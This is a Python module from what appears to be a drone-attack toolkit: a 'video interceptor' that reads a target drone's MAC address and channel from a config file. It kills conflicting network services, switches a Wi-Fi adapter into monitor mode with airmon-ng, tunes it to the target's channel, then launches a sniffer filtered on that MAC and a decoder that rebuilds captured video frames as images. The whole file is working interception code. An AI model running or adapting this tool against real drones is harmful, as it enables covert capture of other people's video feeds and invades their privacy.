import os
import subprocess
import socket
import time
import shutil
import sys
import json
import signal
import traceback
from src.utils import sudo_exec

##################
### PREP MODULE ##
##################

sniff_process = None
decoder_process = None

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")

target_source = target_mac.replace(':','').lower()

options_info = scan_info.get("options", {})
interface = options_info.get("interface")

# Initialize file paths
video_path = os.path.join(os.path.dirname(__file__), '..', '..', 'src', 'video')
tepsotspy_path = os.path.join(video_path, 'tepsots','tepsots.py')
tepsotssh_path = os.path.join(video_path, 'tepsots', 'tepsots.sh')
decoder_path = os.path.join(video_path, 'video_decoder.py')

sniff_output_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'sniff_output.log')

# Check if the file exists
if not os.path.exists(sniff_output_path): # Create the file 
    with open(sniff_output_path, 'w') as file: 
        file.write('') # Write an empty string to create the file 
        print(f'{sniff_output_path} has been created.\n')

image_folder_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'images')

if os.path.exists(image_folder_path): 
    # Clear all contents of the folder 
    for filename in os.listdir(image_folder_path): 
        file_path = os.path.join(image_folder_path, filename) 
        try: 
         if os.path.isfile(file_path) or os.path.islink(file_path): os.unlink(file_path) # Remove file or symbolic link 
         elif os.path.isdir(file_path): 
             shutil.rmtree(file_path)
        except Exception as e: print(f'Failed to delete {file_path}. Reason: {e}')  

def cleanup():
    global sniff_process, decoder_process

    print("Cleaning up...")

    if sniff_process and sniff_process.poll() is None:
        print("Terminating sniffer.")
        sniff_process.terminate()
        try:
            sniff_process.wait(5)
        except subprocess.TimeoutExpired:
            sniff_process.kill()
            sniff_process.wait()

    if decoder_process and decoder_process.poll() is None:
        print("Terminating decoder.")
        decoder_process.terminate()
        try:
            decoder_process.wait(5)
        except subprocess.TimeoutExpired:
            decoder_process.kill()
            decoder_process.wait()
    
    sudo_exec(f"{tepsotssh_path} managed")
    print("Cleanup complete. Exiting video interceptor.")

def signal_handler(signum, frame):
    print("Recieved interrupt signal...")
    cleanup()
    sys.exit(0)

##################
## START MODULE ##
##################

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

try: 
    
    # Stop conflicting processes
    sudo_exec(f"airmon-ng check kill")

    # Start monitor mode
    sudo_exec(f"airmon-ng start {interface}")
    monitor_interface = f"{interface}mon"
    time.sleep(2)

    result = subprocess.run(['ifconfig'], capture_output=True, text=True)
    if monitor_interface not in result.stdout:
        monitor_interface = interface

    # Set network adapter channel to that of the target network
    sudo_exec(f"{tepsotssh_path} set {target_channel}")
    time.sleep(1)

    sniff_cmd = ('sudo', 'python3', '-u', tepsotspy_path, '-i', monitor_interface, '-sa', target_source, '-v')
    decoder_cmd = ('sudo', 'python3', decoder_path, sniff_output_path, image_folder_path)

    # Start sniffer and output to log
    log_file = open(sniff_output_path, 'w', buffering=1)
    print("Starting sniffer...")
    # Start the subprocess and redirect stdout to the log file 
    sniff_process = subprocess.Popen(sniff_cmd, stdout=log_file, stderr=sys.stdout, text=True)

    time.sleep(2)

    print("Starting decoder...")
    decoder_process = subprocess.Popen(decoder_cmd, stdout=sys.stdout, stderr=sys.stderr)

    time.sleep(1)

    print("\n Interceptor is running. Press Ctrl+C to stop.")

    # Wait for both processes to finish
    while True:
        sniffer_status = sniff_process.poll()
        if sniffer_status is not None:
            print(f"Error: Sniffer process exited unexpectedly with code {sniffer_status}")
            break

        decoder_status = decoder_process.poll()
        if decoder_status is not None:
            print(f"Error: Decoder process exited unepectedly with code {decoder_status}.")
            break

        time.sleep(1)

except KeyboardInterrupt:
    print("Shutting down video interceptor...")

except Exception as e:
    print(f"\nAs error occurred: {e}")
    traceback.print_exc()

finally:
    cleanup()
    if 'log_file' in locals() and not log_file.closed:
        log_file.close()
    print("Video interceptor exited.")
    sys.exit(0)